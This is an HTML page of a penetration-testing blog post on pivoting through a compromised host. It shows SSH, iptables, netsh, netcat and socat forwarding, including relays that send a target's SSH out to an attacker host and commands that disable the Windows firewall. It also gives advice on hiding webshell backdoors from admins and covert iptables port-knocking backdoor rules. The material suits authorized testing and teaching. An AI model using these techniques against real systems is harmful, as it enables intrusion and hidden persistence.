<!DOCTYPE html>
<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="Approach
In penetration testing, you almost always need a proxy server, so let‚Äôs start by assuming we have a server with a public IP as the attacker machine."><title>Data Forwarding Techniques in Penetration Testing&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Data Forwarding Techniques in Penetration Testing" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/en/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/en/categories/">Categories</a><a class="nav item" href="/en/tags/">Tags</a><a class="nav item" href="/en/about/">About</a><a class="nav item" href="/en/links/">Links</a><a class="nav item" href="/zh/posts/data-forwarding-techniques-in-pentest/" title="‰∏≠Êñá">
            <span class="lang-icon">üåê</span>‰∏≠Êñá</a></nav></div></span></div></section><section id="content"><style>
     
    .toc-wrapper {
        position: fixed;
        bottom: 30px;
        right: 30px;
        z-index: 9999;
        display: flex;
        flex-direction: column-reverse;
        align-items: flex-end;
        gap: 10px;
    }

     
    .toc-button {
        background-color: #fff;
        color: #333;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        border: 1px solid #ddd;
        transition: transform 0.2s, box-shadow 0.2s;
    }

    .toc-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
    }

    .toc-button svg {
        width: 24px;
        height: 24px;
        fill: currentColor;
    }

     
    .toc-content-box {
        background: #fff;
        border: 1px solid #eee;
        border-radius: 8px;
        padding: 15px;
        width: 250px;
        max-height: 60vh;
        overflow-y: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        display: none;
         
        font-size: 0.9em;
        opacity: 0;
        transform: translateY(10px);
        transition: opacity 0.3s, transform 0.3s;
    }

    .toc-content-box.show {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }

    .toc-header {
        font-weight: bold;
        border-bottom: 2px solid #f0f0f0;
        padding-bottom: 8px;
        margin-bottom: 8px;
        font-size: 1.1em;
    }

     
    #TableOfContents {
        text-align: left;
    }

    #TableOfContents ul,
    #TableOfContents ol {
        list-style: none;
        padding-left: 0;
        margin: 0;
    }

    #TableOfContents li {
        margin: 4px 0;
    }

    #TableOfContents ul ul,
    #TableOfContents ol ol {
        padding-left: 1em;
    }

    #TableOfContents a {
        text-decoration: none;
        color: #555;
        display: block;
        padding: 2px 0;
        transition: color 0.2s;
    }

    #TableOfContents a:hover {
        color: #007bff;
    }

     
    @media (prefers-color-scheme: dark) {
        .toc-button {
            background-color: #333;
            color: #ddd;
            border-color: #555;
        }

        .toc-content-box {
            background-color: #2a2a2a;
            border-color: #444;
            color: #ddd;
        }

        .toc-header {
            border-bottom-color: #444;
        }

        #TableOfContents a {
            color: #aaa;
        }

        #TableOfContents a:hover {
            color: #fff;
        }
    }
</style><div class="article-container"><section class="article header">
    <h1 class="article title">Data Forwarding Techniques in Penetration Testing</h1><p class="article date">Wednesday, April 4, 2018<span class="langs"><span class="lang">
                    <a href="/zh/posts/data-forwarding-techniques-in-pentest/" title="‰∏≠Êñá">
                        <span class="lang-icon">üåê</span>‰∏≠Êñá</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="approach">Approach</h2>
<p>In penetration testing, you almost always need a proxy server, so let‚Äôs start by assuming we have a server with a public IP as the attacker machine.</p>
<p>‚ÄúInternal network‚Äù is relative. Sometimes you get into a DMZ and then find you need to use a VPN to reach the target subnet. Here we only discuss an attack path with a single compromised host, treating it as the minimal unit. The goal is to derive a methodology that can be applied to environments with multiple pivot hosts.</p>
<p>If the compromised host exposes ports to the public internet and has no firewall so you can freely access its ports, then you can abstract it directly as the attacker machine.</p>
<p>However, if the compromised host is not directly exposed to the public internet, or there is an upstream device functioning as a firewall, then proceed with the steps below.</p>
<p>In most cases, you access services over TCP.</p>
<ul>
<li>Port mapping: map the target port to an unused port to pivot into the internal network; you can also use port multiplexing (e.g., iptables).</li>
<li>Forward proxy: directly use the port as a tunnel to pivot into the internal network.</li>
<li>Reverse proxy: if inbound connections from outside are not possible, have the compromised host initiate a reverse connection back to the attacker server.</li>
</ul>
<p>If the target server cannot make outbound TCP connections, you can use a UDP tunnel. In that case, there isn‚Äôt really a ‚Äúforward vs reverse‚Äù concept; it‚Äôs more about client vs server.
Sometimes you‚Äôll run into hosts with firewalls. If it‚Äôs a blacklist policy it‚Äôs relatively easier. If it‚Äôs a whitelist policy, UDP is usually not blocked; outbound port 53 might be allowed.
If even outbound UDP is blocked, you can try an ICMP tunnel‚Äîbut in such scenarios ICMP packets are very likely to be filtered.</p>
<p>Most of the time tunnels are not very stable. A common approach is: after establishing a tunnel, leverage the victim‚Äôs SSH service to enable a SOCKS5 proxy into the internal network (with a SOCKS client such as proxychains‚ÄëNG or Proxifier).</p>
<p>Define A as the attacker, B as the compromised pivot host, and C as other hosts (which could also be B itself). We‚Äôll use these symbols in the rest of the post.
Next, clarify a few concepts. As long as you can distinguish mapping vs tunneling, that‚Äôs enough. The Chinese wording can be a bit subtle: both mapping and tunneling are forwarding. Mapping can be seen as ‚Äúforward‚Äù forwarding; a callback can be seen as ‚Äúreverse‚Äù forwarding.</p>
<ul>
<li>Mapping: B listens on a port, C listens on a port; B forwards requests from A to C‚Äîi.e., C is mapped onto B.</li>
<li>Tunnel: A listens on a port, C listens on a port; B actively forwards C‚Äôs listening port to A, so A‚ÜîC is effectively a tunnel.</li>
<li>Callback: A listens on a port, B listens on a port; some condition triggers B to actively connect back to A.</li>
</ul>
<h2 id="direct-forwarding">Direct Forwarding</h2>
<p>This section refers to forwarding at the network and transport layers.</p>
<h3 id="ssh">SSH</h3>
<p>This section is only for SSH1. First, a few useful options:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-C <span class="nb">enable</span> compression<span class="p">;</span> useful on poor networks, also handy <span class="k">for</span> moving data
</span></span><span class="line"><span class="cl">-N <span class="k">do</span> not execute any command<span class="p">;</span> only <span class="k">do</span> port forwarding
</span></span><span class="line"><span class="cl">-g allow remote hosts to connect to <span class="nb">local</span> forwarded ports<span class="p">;</span> required <span class="k">if</span> you want to access a <span class="nb">local</span> port on the victim
</span></span><span class="line"><span class="cl">-q quiet mode
</span></span><span class="line"><span class="cl">-T disable pseudo-tty<span class="p">;</span> <span class="sb">`</span>who<span class="sb">`</span> won‚Äôt show pseudo-tty users <span class="o">(</span>but it seems unnecessary here<span class="o">)</span>
</span></span></code></pre></div><h4 id="forward-a-remote-port-to-a-local-port">Forward a remote port to a local port</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -Ng -L local:13389:target_C:3389 root@victim_B
</span></span></code></pre></div><h4 id="forward-a-local-port-to-a-remote-port">Forward a local port to a remote port</h4>
<p>You may need to configure <code>/etc/ssh/sshd_config</code>:
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -N -R remote:3000:local:80 root@victim_B
</span></span></code></pre></div><h4 id="use-a-socks5-proxy">Use a SOCKS5 proxy</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -N -D 127.0.0.1:1080 root@victim_B
</span></span></code></pre></div><h3 id="iptables-port-mapping">iptables Port Mapping</h3>
<p>First, enable IPv4 forwarding in the kernel:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
</span></span></code></pre></div><p>Use NAT to forward ports:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -t nat -A PREROUTING -d victim_B -p tcp --dport listen_port -j DNAT --to-destination target_C:target_port
</span></span><span class="line"><span class="cl">iptables -t nat -A POSTROUTING -d target_C -p tcp --dport target_port -j SNAT --to victim_B
</span></span></code></pre></div><h3 id="netsh-port-mapping">netsh Port Mapping</h3>
<p>Use the built-in port mapping feature:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy add v4tov4 listenaddress=victim_B listenport=3388 connectaddress=target_C connectport=3389
</span></span></code></pre></div><p>Delete forwarding rules:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy delete v4tov4 listenaddress=victim_B  listenport=3388
</span></span></code></pre></div><p>Allow the corresponding inbound firewall rule:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh advfirewall firewall add rule name=<span class="s2">&#34;forwarded_RDP_3388&#34;</span> protocol=TCP dir=in localip=victim_B localport=3388 action=allow
</span></span></code></pre></div><p>You can also disable the firewall:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># newer versions</span>
</span></span><span class="line"><span class="cl">netsh advfirewall <span class="nb">set</span> allprofiles state off
</span></span><span class="line"><span class="cl"><span class="c1"># older versions</span>
</span></span><span class="line"><span class="cl">netsh firewall <span class="nb">set</span> opmode disable
</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
</span></span><span class="line"><span class="cl">net stop mpssvc
</span></span></code></pre></div><p>Show all proxies:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy show all
</span></span></code></pre></div><h3 id="netcat">netcat</h3>
<p>In mainstream distributions, most Netcat variants don‚Äôt support listening ports and program redirection.
Netcat is a powerful networking tool (scanning, various data transfers, etc.). Ncat is an improved version. Here we only cover network-layer forwarding and mapping.
SoCat is even more powerful: it supports more I/O types and connection multiplexing.</p>
<h4 id="port-mapping">Port mapping</h4>
<p>First, create a FIFO on host B, then map host C‚Äôs SSH port to port 9000 on host B:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifo
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc target_C <span class="m">22</span> <span class="p">|</span> nc -vlp <span class="m">9000</span> &gt; /tmp/fifo
</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vlp <span class="m">9000</span> <span class="p">|</span> nc target_C <span class="m">22</span> &gt; /tmp/fifo
</span></span></code></pre></div><p>Or use <code>socat</code> (single connection only):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-listen:9000
</span></span></code></pre></div><p>Use <code>reuseaddr</code>, <code>reuseport</code>, <code>fork</code> to allow multiple connections:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:9000,reuseaddr,reuseport,fork tcp-connect:target_C:22
</span></span></code></pre></div><p>On host A, SSH to port 9000 on host B and you‚Äôll be using host C‚Äôs SSH service:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@victim_B -p <span class="m">9000</span>
</span></span></code></pre></div><h4 id="port-forwarding">Port forwarding</h4>
<p>First, create a FIFO on host A, then listen on port 8888 to receive forwarded data from host B, and listen on port 9000 as the forwarding service port.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifo
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vlp <span class="m">8888</span> <span class="p">|</span> nc -vlp <span class="m">9000</span> &gt; /tmp/fifo
</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vlp <span class="m">9000</span> <span class="p">|</span> nc -vlp <span class="m">8888</span> &gt; /tmp/fifo
</span></span></code></pre></div><p>Or use <code>socat</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:8888,reuseaddr,reuseport,fork tcp-listen:9000,reuseaddr,reuseport,fork
</span></span></code></pre></div><p>Next, create a FIFO on host B, then forward host C‚Äôs SSH service to port 8888 that the attacker listens on.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifo
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc target_C <span class="m">22</span> <span class="p">|</span> nc attacker_A <span class="m">8888</span> &gt; /tmp/fifo
</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc attacker_A <span class="m">8888</span> <span class="p">|</span> nc target_C <span class="m">22</span> &gt; /tmp/fifo
</span></span></code></pre></div><p>Or use <code>socat</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-connect:attacker_A:8888
</span></span></code></pre></div><p>Finally, SSH to port 9000 on host A; that effectively connects to port 22 on host C:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@attacker_A -p <span class="m">9000</span>
</span></span></code></pre></div><h3 id="socat">socat</h3>
<p>SoCat is similar to Netcat in usage but much more powerful. It supports multiple protocols at different layers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">TCP4    TCP IPv4
</span></span><span class="line"><span class="cl">TCP6    TCP IPv6
</span></span><span class="line"><span class="cl">UDP     UDP protocol
</span></span><span class="line"><span class="cl">UNIX    UNIX local socket
</span></span><span class="line"><span class="cl">SCTP4   SCTP IPv4
</span></span><span class="line"><span class="cl">SCTP6   SCTP IPv6
</span></span><span class="line"><span class="cl">OPENSSL Secure Sockets Layer
</span></span><span class="line"><span class="cl">SOCKET  socket
</span></span></code></pre></div><h4 id="mapping">Mapping</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-listen:9000
</span></span></code></pre></div><p>Use <code>reuseaddr</code>, <code>reuseport</code>, <code>fork</code> to allow multiple connections:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:9000,reuseaddr,reuseport,fork tcp-connect:target_C:22
</span></span></code></pre></div><h4 id="forwarding">Forwarding</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># victim_B</span>
</span></span><span class="line"><span class="cl">socat tcp-listen:8888,reuseaddr,reuseport,fork tcp-listen:9000,reuseaddr,reuseport,fork
</span></span><span class="line"><span class="cl"><span class="c1"># attacker_A</span>
</span></span><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-connect:attacker_A:8888
</span></span></code></pre></div><h3 id="udp-tunnel">UDP Tunnel</h3>
<p>On Linux you can use SoCat, but on Windows you can‚Äôt (at least not the same way).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat UDP-LISTEN:8888 tcp-connect:target_C:22
</span></span></code></pre></div><p>With Netcat, just add <code>-u</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vulp <span class="m">9000</span> <span class="p">|</span> nc 192.168.1.127 <span class="m">22</span> &gt; /tmp/fifo
</span></span></code></pre></div><h4 id="rtcp2udp">rtcp2udp</h4>
<p><a href="https://github.com/ring04h/rtcp2udp"target="_blank" rel="noopener noreferrer">https://github.com/ring04h/rtcp2udp</a></p>
<h4 id="udptunnel">udptunnel</h4>
<p><a href="https://code.google.com/p/udptunnel/"target="_blank" rel="noopener noreferrer">https://code.google.com/p/udptunnel/</a></p>
<h3 id="icmp-tunnel">ICMP Tunnel</h3>
<p>First, make sure this is 0:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/proc/sys/net/ipv4/icmp_echo_ignore_all
</span></span></code></pre></div><h4 id="icmptunnel">icmptunnel</h4>
<p><a href="https://github.com/jamesbarlow/icmptunnel.git"target="_blank" rel="noopener noreferrer">https://github.com/jamesbarlow/icmptunnel.git</a></p>
<h4 id="ptunnel">ptunnel</h4>
<p>Linux:</p>
<p><a href="https://pkgs.org/download/ptunnel"target="_blank" rel="noopener noreferrer">https://pkgs.org/download/ptunnel</a></p>
<p>Windows:</p>
<p><a href="https://github.com/ptunnel-win"target="_blank" rel="noopener noreferrer">https://github.com/ptunnel-win</a></p>
<h3 id="sctp-tunnel">SCTP Tunnel</h3>
<p>SCTP is a transport-layer protocol and is usually outside typical firewall TCP/UDP policies. Ncat supports it. Here we use SoCat; similar to port mapping, it listens on SCTP port 8888.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat SCTP-LISTEN:8888 tcp-connect:target_C:22
</span></span></code></pre></div><h4 id="dccp-tunnel">DCCP Tunnel</h4>
<p>Most Linux distributions don‚Äôt support it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat TCP4-LISTEN:8886,reuseaddr,type<span class="o">=</span>6,prototype<span class="o">=</span><span class="m">33</span> TCP-CONNECT:target_C:22
</span></span><span class="line"><span class="cl">socat TCP4-CONNECT:8886,reuseaddr,type<span class="o">=</span>6,prototype<span class="o">=</span><span class="m">33</span> TCP-LISTEN:9000
</span></span></code></pre></div><h3 id="nginx-forwarding">Nginx Forwarding</h3>
<p>First, make sure your Nginx is built with the <code>stream</code> module:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># output includes --with-stream</span>
</span></span><span class="line"><span class="cl">nginx -V <span class="p">|</span> grep stream
</span></span></code></pre></div><p>Add the following to <code>nginx.conf</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">stream {
</span></span><span class="line"><span class="cl">    server {
</span></span><span class="line"><span class="cl">    listen 88;
</span></span><span class="line"><span class="cl">    proxy_connect_timeout 3s;
</span></span><span class="line"><span class="cl">    proxy_timeout 10s;
</span></span><span class="line"><span class="cl">    proxy_pass 127.0.0.1:22;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>Reload the Nginx configuration:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nginx -s reload
</span></span></code></pre></div><h3 id="other-tools">Other Tools</h3>
<p><a href="https://github.com/vzex/dog-tunnel"target="_blank" rel="noopener noreferrer">dog-tunnel</a> - a proxy tool mainly for hole punching; recommended by a coworker
<a href="http://rootkiter.com/EarthWorm/"target="_blank" rel="noopener noreferrer">EarthWorm</a> - ‚Äúwormhole‚Äù, cross-platform, commonly praised; but it disconnects a lot for me and feels unstable
<a href="http://rootkiter.com/Termite/"target="_blank" rel="noopener noreferrer">Termite</a> - next-gen ‚Äúant colony‚Äù of EarthWorm, cross-platform; great idea but crashes frequently in my experience
JSPspy, ASPXspy, PHPspy - no download links; these webshells include tunnel and port mapping features
<a href="https://www.mcafee.com/au/downloads/free-tools/fpipe.aspx"target="_blank" rel="noopener noreferrer">fpipe</a> - archaeology-grade; McAfee port mapping tool (Windows)
<a href="https://sourceforge.net/projects/pjs-passport/"target="_blank" rel="noopener noreferrer">passport</a> - archaeology-grade; port forwarding tool on XP, supports UDP
<a href="https://github.com/zcnhonker/HTran"target="_blank" rel="noopener noreferrer">HTran</a> - archaeology-grade; also known as lcx; average speed but stable</p>
<h2 id="application-layer-tunnels">Application-Layer Tunnels</h2>
<h3 id="socks">Socks</h3>
<p>If conditions allow, you can run a SOCKS service on a server and use it with a client. Because it‚Äôs simple and there are plenty of tools (and many other tools bundle it), this section focuses on SOCKS5 (RFC1928) and just lists a few implementations.</p>
<p><a href="https://github.com/armon/go-socks5"target="_blank" rel="noopener noreferrer">Go Socks5</a>
<a href="https://github.com/ThrDev/Socks5"target="_blank" rel="noopener noreferrer">C# Socks5</a>
<a href="https://github.com/isayme/socks5"target="_blank" rel="noopener noreferrer">C++ Socks5</a>
<a href="https://github.com/Drewsif/PySecretSOCKS"target="_blank" rel="noopener noreferrer">py Socks4/5</a>
<a href="https://github.com/p3nt4/Invoke-SocksProxy"target="_blank" rel="noopener noreferrer">PS Socks4/5</a> - supports port mapping</p>
<h3 id="apt">APT</h3>
<p>In Metasploit (MSF), you can use port forwarding and proxy features:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">portfwd add -l <span class="m">2222</span> -r target -p <span class="m">3389</span>
</span></span></code></pre></div><p>Set routes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add 192.168.0.0 255.255.0.0 <span class="m">1</span>
</span></span></code></pre></div><p>Enable a SOCKS4a proxy:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/server/socks4a
</span></span><span class="line"><span class="cl"><span class="nb">set</span> SRVPORT <span class="m">2080</span>
</span></span><span class="line"><span class="cl">exploit -y
</span></span></code></pre></div><p>Cobalt Strike can start a SOCKS4A proxy on the target, forward it to the Teamserver, and then the Teamserver listens on a port waiting for the attacker to connect.</p>
<h3 id="dns-tunnel">DNS tunnel</h3>
<p><a href="https://github.com/yarrick/iodine"target="_blank" rel="noopener noreferrer">iodine</a> - a very useful DNS tunnel
<a href="https://pkgs.org/download/dns2tcp"target="_blank" rel="noopener noreferrer">Dns2tcp</a> - a DNS tunnel preinstalled on Kali
<a href="https://github.com/iagox86/dnscat2"target="_blank" rel="noopener noreferrer">dnscat2</a> - a Ruby-based DNS tunnel; haven‚Äôt used it yet</p>
<h3 id="webshell-tunnel">WebShell tunnel</h3>
<p><a href="https://github.com/gorgiaxx/reGeorg"target="_blank" rel="noopener noreferrer">reGeorg</a> - a modified reGeorg; supports custom headers, reduces connection count, faster and more stable
<a href="https://github.com/SECFORCE/Tunna"target="_blank" rel="noopener noreferrer">Tunna</a> - another forward proxy; adds custom cookies and basic auth; average stability
<a href="https://github.com/nccgroup/ABPTTS"target="_blank" rel="noopener noreferrer">ABPTTS</a> - said to combine the strengths of reGeorg and Tunna; more stable and more compatible, but doesn‚Äôt support custom HTTP headers; I‚Äôll add it someday
<a href="https://github.com/sensepost/reDuh.git"target="_blank" rel="noopener noreferrer">reDuh</a> - archaeology; predecessor of reGeorg</p>
<h3 id="rmi-deserialized-tunnel">RMI Deserialized tunnel</h3>
<p>TODO. I got the idea after hearing N1nty share ‚ÄúJSPspy on RMI‚Äù last time. I‚Äôll fill this in when I have time.</p>
<h2 id="multiplexing-tricks">Multiplexing Tricks</h2>
<p>Sometimes resources are limited and you cannot add new ones, so you need to reuse what‚Äôs already there.</p>
<h3 id="webshell">Webshell</h3>
<p>Since webshell tunnels are mentioned above, a quick note. Sometimes dropping a new webshell file directly under a directory will be noticed by admins, which is awkward. You can instead insert a backdoor into an existing file‚Äîe.g., a webshell with a ‚Äústatic resource‚Äù file extension. Or modify config so the server parses those resource types as scripts. You can also load it into memory, but it becomes ineffective after a service restart.</p>
<p>With Nginx, for HTTP services, you can reuse the port via routing rules and parse resource-file webshells.</p>
<p>TODO: can Nginx <code>stream</code> and HTTP services share the same port? It might require Lua.</p>
<h3 id="iptables-rules">iptables Rules</h3>
<p>This borrows from <a href="https://threathunter.org/topic/594545184ea5b2f5516e2033"target="_blank" rel="noopener noreferrer">N1nty‚Äôs write-up</a>. The author explains a technique where receiving packets with a specific signature triggers corresponding rules. First you create forwarding rules, then create the trigger mechanism. This post was also published on other security media; someone in the comments smugly mentioned IP-based forwarding‚Äîwhich just shows they didn‚Äôt read carefully.</p>
<h4 id="split-traffic-by-source-port">Split traffic by source port</h4>
<p>Redirect traffic destined to local port 80 with source port 8989 to local port 22:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/sbin/iptables -t nat -A PREROUTING -p tcp --sport <span class="m">8989</span> --dport <span class="m">80</span> -j REDIRECT --to-port <span class="m">22</span>
</span></span></code></pre></div><p>Listen on local port 9000, and access the victim‚Äôs port 80 using source port 8989:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:9000,fork,reuseaddr tcp:victim_B:80,sourceport<span class="o">=</span>8989,reuseaddr <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl">ssh attacker_A@127.0.0.1 -p <span class="m">9000</span>
</span></span></code></pre></div><h4 id="split-traffic-by-icmp-length">Split traffic by ICMP length</h4>
<blockquote>
<p>Use ICMP as a remote on/off switch. The downside is: if the target is inside an internal network, you can‚Äôt ping it directly.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># create a port-multiplexing chain</span>
</span></span><span class="line"><span class="cl">iptables -t nat -N LETMEIN
</span></span><span class="line"><span class="cl"><span class="c1"># create port-multiplexing rule, forward traffic to port 22</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port <span class="m">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># enable switch: if an ICMP packet of length 1139 is received, add the source IP to the letmein list</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p icmp --icmp-type <span class="m">8</span> -m length --length <span class="m">1139</span> -m recent --set --name letmein --rsource -j ACCEPT
</span></span><span class="line"><span class="cl"><span class="c1"># disable switch: if an ICMP packet of length 1140 is received, remove the source IP from the letmein list</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p icmp --icmp-type <span class="m">8</span> -m length --length <span class="m">1140</span> -m recent --name letmein --remove -j ACCEPT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># let&#39;s do it: if a SYN packet‚Äôs source IP is in the letmein list, jump to LETMEIN chain; effective for 3600 seconds</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">80</span> --syn -m recent --rcheck --seconds <span class="m">3600</span> --name letmein --rsource -j LETMEIN
</span></span></code></pre></div><p>The IP header is 20 bytes and the ICMP header is 8 bytes, so the iptables packet length is: ICMP payload length + 28 bytes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## enable LETMEIN</span>
</span></span><span class="line"><span class="cl">ping -c <span class="m">1</span> -s <span class="m">1111</span> victim_B
</span></span><span class="line"><span class="cl"><span class="c1">## disable LETMEIN</span>
</span></span><span class="line"><span class="cl">ping -c <span class="m">1</span> -s <span class="m">1112</span> victim_B
</span></span></code></pre></div><h4 id="split-traffic-by-tcp-keyword">Split traffic by TCP keyword</h4>
<blockquote>
<p>Use a keyword in TCP packets as a remote on/off switch; works even if the target is in an internal network.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># port-multiplexing chain</span>
</span></span><span class="line"><span class="cl">iptables -t nat -N LETMEIN
</span></span><span class="line"><span class="cl"><span class="c1"># port-multiplexing rule</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port <span class="m">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># enable switch</span>
</span></span><span class="line"><span class="cl">iptables -A INPUT -p tcp -m string --string <span class="s1">&#39;threathuntercoming&#39;</span> --algo bm -m recent --set --name letmein --rsource -j ACCEPT
</span></span><span class="line"><span class="cl"><span class="c1"># disable switch</span>
</span></span><span class="line"><span class="cl">iptables -A INPUT -p tcp -m string --string <span class="s1">&#39;threathunterleaving&#39;</span> --algo bm -m recent --name letmein --remove -j ACCEPT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># let&#39;s do it</span>
